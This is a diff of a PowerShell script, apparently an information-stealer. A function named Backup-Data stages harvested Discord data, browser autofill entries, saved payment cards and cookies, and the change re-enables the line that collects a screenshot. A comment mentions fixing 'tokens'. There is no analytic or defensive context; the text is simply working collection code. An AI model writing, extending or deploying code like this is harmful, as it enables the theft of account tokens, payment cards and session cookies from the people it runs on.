@@ -845,7 +845,7 @@ function Backup-Data {
 
     #TODO ill fix tokens tomorrow
     Move-Item "$main_temp\discord.json" $folder_general -Force	
-    #Move-Item "$main_temp\screenshot.png" $folder_general -Force
+    Move-Item "$main_temp\screenshot.png" $folder_general -Force
     Move-Item -Path "$main_temp\autofill.json" -Destination "$browser_data" -Force
     Move-Item -Path "$main_temp\cards.json" -Destination "$browser_data" -Force
     Move-Item -Path "$main_temp\cookies.json" -Destination "$browser_data" -Force
